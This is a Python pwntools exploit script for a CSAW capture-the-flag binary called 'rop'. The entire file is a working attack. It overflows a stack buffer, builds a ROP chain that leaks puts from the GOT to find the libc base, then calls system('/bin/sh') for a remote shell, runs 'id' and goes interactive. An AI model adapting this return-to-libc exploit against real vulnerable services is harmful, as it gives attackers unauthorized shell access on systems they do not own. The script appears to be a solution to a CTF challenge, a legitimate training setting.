from pwn import *
from struct import *

_remote=1
_debug=0
_gdb=0

prog="./rop"
elf_prog=ELF(prog)

if _remote:
	proc=remote("pwn.chal.csaw.io",5016)
	libc=ELF("./libc-2.27.so")
else:
	proc=process(prog)
	libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")


if _gdb and _debug and _remote==0:
	gdb.attach(proc, '''
	set pagination off
	set disassembly-flavor intel
	define hook-stop
	echo ****************************************************\\n
	echo ====================info register===================\\n
	info register
	echo ================32 word hex of ESP==================\\n
	x/32gx $rsp
	echo ================16 word hex of EBP==================\\n
	x/16gx $rbp
	echo ================next 5 instruction==================\\n
	x/5i $rip
	echo ****************************************************\\n
	end'''+
	#break point at main
	"b*0x0000000000400601\n"+
	#break point before main ret
	'''b*0x000000000040060b
	continue	
	''')

addr_main=elf_prog.symbols['main']
got_puts=elf_prog.got['puts']

# ROPgadget --binary rop --only "pop|ret"
pop_rdi_ret=0x0000000000400683

plt_puts= elf_prog.plt['puts']


# phase 1 leak libc address
payload  = ""
payload += "a"*(32+8) # padding to EBP of main
payload += pack("Q",pop_rdi_ret)
payload += pack("Q",got_puts)
payload += pack("Q",plt_puts) # puts(got_puts)
payload += pack("Q",addr_main) # go back to main

print payload
proc.sendlineafter('Hello\n',payload)


raw_byte=proc.recvline()

libc_puts=unpack("Q",raw_byte[:-1].ljust(8, '\x00'))[0]



libc_base=libc_puts-libc.symbols['puts']
libc_system=libc_base+libc.symbols['system']
libc_binsh=libc_base+libc.search('/bin/sh').next()


print "==="
print "libc_base = "+hex(libc_base)
print "libc_puts = "+hex(libc_puts)
print "libc_system = "+hex(libc_system)
print "libc_binsh = "+hex(libc_binsh)
print "==="


# phase 2 contruct payload system('/bin/sh')
payload_getshell  = ""
payload_getshell += "a"*(32+8)
payload_getshell += pack("Q",pop_rdi_ret)
payload_getshell += pack("Q",libc_binsh)
payload_getshell += pack("Q",libc_system)

proc.sendlineafter('Hello\n',payload_getshell)
proc.sendline("id")

proc.interactive()
